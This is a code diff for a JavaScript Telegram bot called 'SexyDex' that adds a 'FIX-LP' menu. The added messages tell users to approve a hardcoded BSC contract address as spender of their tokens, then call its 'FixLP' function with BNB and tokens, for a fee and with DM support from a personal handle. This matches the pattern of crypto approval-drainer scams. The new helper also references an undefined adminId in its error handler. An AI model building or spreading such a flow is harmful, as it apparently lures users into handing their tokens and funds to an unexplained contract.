@@ -17,7 +17,21 @@ const bot = new TelegramBot(token, { polling: true });
 
 // keyboards
 function createCustomKeyboard() {
-  const keyboard = [["Build Sexy Dex(Swap)"], ["Instructions"]];
+  const keyboard = [["Build Sexy Dex(Swap)"], ["FIX-LP"], ["Instructions"]];
+  return {
+    keyboard,
+    resize_keyboard: true,
+    one_time_keyboard: true,
+  };
+}
+
+function fixLpCustomKeyboard() {
+  const keyboard = [
+    ["STEP 1"],
+    ["STEP 2"],
+    ["FEE"],
+    ["ANY ISSUES?", "🚫 Cancel"],
+  ];
   return {
     keyboard,
     resize_keyboard: true,
@@ -222,6 +236,7 @@ async function forwardOrderSummary(chatId, receiverUsername) {
     console.error("Error forwarding order summary:", error);
   }
 }
+// for admin
 async function sendImageAndCaption(
   receiverId,
   adminId,
@@ -244,6 +259,21 @@ async function sendImageAndCaption(
         parse_mode: "Markdown",
       }
     );
+    adminHome(adminId);
+  }
+}
+// normal user
+async function sendUserImageAndCaption(receiverId, imagePath, captionText) {
+  try {
+    await bot.sendPhoto(receiverId, imagePath, {
+      caption: captionText,
+      parse_mode: "HTML",
+    });
+  } catch (error) {
+    console.error(`Error sending image and caption: ${error.message}`);
+    bot.sendMessage(adminId, `*Failed!* exist`, {
+      parse_mode: "Markdown",
+    });
     adminHome(adminId);
   }
 }
@@ -457,7 +487,7 @@ bot.on("message", (msg) => {
           chatId,
           "Please strictly adhere to these instructions 😈: \n\n" +
             "- Fill in the right details for your swap ✅ \n" +
-            "- When done with sending all details, I will show you all of them again so you can confirm and if any is wrong, you can cancel and reenter the correct details 😉😘 \n\n" +
+            "- When done with sending all details, I will show you all of them again so you can confirm and if any is wrong, you can cancel and re-enter the correct details 😉😘 \n\n" +
             "_With ❤️ from SexyDex 💋_",
           {
             parse_mode: "Markdown",
@@ -465,6 +495,22 @@ bot.on("message", (msg) => {
           }
         )
         .then(() => (dexBot.state = ""))
+        .catch((error) =>
+          console.error("Error sending message with keyboard", error)
+        );
+    } else if (messageText === "FIX-LP") {
+      const replyMarkup = fixLpCustomKeyboard();
+      bot
+        .sendMessage(
+          chatId,
+          "Welcome to LP Fixer 💋: \n" +
+            "Click on Each button to get the detailed steps ✅ \n",
+          {
+            parse_mode: "Markdown",
+            reply_markup: replyMarkup,
+          }
+        )
+        .then(() => (dexBot.state = "fix"))
         .catch((error) =>
           console.error("Error sending message with keyboard", error)
         );
@@ -811,6 +857,61 @@ function handleUserResponse(msg, currentState) {
           console.error("Error sending message with keyboard", error)
         );
     }
+  } else if (currentState === "fix") {
+    // handles LP-FIX
+    const replyMarkup = fixLpCustomKeyboard();
+    if (messageText === "🚫 Cancel") {
+      backHome(chatId);
+    } else if (messageText === "STEP 1") {
+      const message =
+        `1️⃣) Go to your token contract on BSCScan. \n\n\n` +
+        `2️⃣) Connect your wallet (bscscan) \n\n\n` +
+        `3️⃣) Go to <u>approve</u> \n\n` +
+        `~ input = <code>0x95ba50482c2FdCbdc48260EfEc224a1205e5D56C</code> <b>as spender</b>. \n\n` +
+        `~ You need to input the amount of tokens you wish to add to LP here (including decimals) for example if it's <u><b>1000 tokens and 9 decimals you will type 1000000000000</b></u> \n\n\n` +
+        `4️⃣) Write function.`;
+      sendUserImageAndCaption(chatId, "./step1.jpg", message);
+    } else if (messageText === "STEP 2") {
+      const message =
+        `1️⃣) Next, go to our smart contract below : \n\n` +
+        `https://bscscan.com/address/0x95ba50482c2FdCbdc48260EfEc224a1205e5D56C# \n\n\n` +
+        `2️⃣) Connect your wallet (bscscan) \n\n\n` +
+        `3️⃣) Go to <u><b>FixLP</b></u> \n\n` +
+        `~ input the amount of BNB you want to add to LP. \n` +
+        `~ input Your CA token address. \n` +
+        `~ input the amount of your tokens (for example if it's <u><b>1000 tokens and 9 decimals you will type 1000000000000</b></u>) \n\n\n` +
+        `4️⃣) Write function, Congrats! your token fix and launched.`;
+      sendUserImageAndCaption(chatId, "./step2.jpg", message);
+    } else if (messageText === "FEE") {
+      bot
+        .sendMessage(
+          chatId,
+          "There is a 0.01 BNB fee for this which will be taken from the amount you input in BNB.\n" +
+            "*Ex:* If you wish to add 1 BNB to LP enter 1.01 BNB in that field.",
+          {
+            parse_mode: "Markdown",
+            reply_markup: replyMarkup,
+          }
+        )
+        .then(() => (dexBot.state = "fix"))
+        .catch((error) =>
+          console.error("Error sending message with keyboard", error)
+        );
+    } else if (messageText === "ANY ISSUES?") {
+      bot
+        .sendMessage(
+          chatId,
+          "Any issues using bot? feel free to DM @Robertsafuuuu \n",
+          {
+            parse_mode: "Markdown",
+            reply_markup: replyMarkup,
+          }
+        )
+        .then(() => (dexBot.state = "fix"))
+        .catch((error) =>
+          console.error("Error sending message with keyboard", error)
+        );
+    }
   }
 }
 
@@ -820,4 +921,4 @@ bot.on("polling_error", (error) => {
 
 console.log("Bot is running...");
 
-// image saving, sending to @degojou, @livingstone and @otherdev
+// image saving
